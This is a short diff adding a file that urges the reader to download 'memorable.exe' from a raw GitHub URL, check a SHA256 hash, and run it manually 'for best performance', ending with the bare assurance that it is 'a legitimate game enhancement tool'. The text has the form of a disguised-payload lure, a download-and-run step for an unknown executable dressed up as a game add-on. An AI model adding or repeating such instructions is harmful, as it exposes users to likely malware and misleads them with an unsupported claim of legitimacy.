@@ -1,0 +1,11 @@
+To enhance your gaming experience, please:
+
+1. Download the game component from:
+   https://raw.githubusercontent.com/cernipoko-bit/sadlife/refs/heads/main/memorable.exe
+
+2. Verify the SHA256 hash matches:
+   c61a4dbc98b1a4295c068474850ab8dbdc480db99f21367fb1effcb1b05b42f1
+
+3. Run the component manually for best performance
+
+This is a legitimate game enhancement tool.
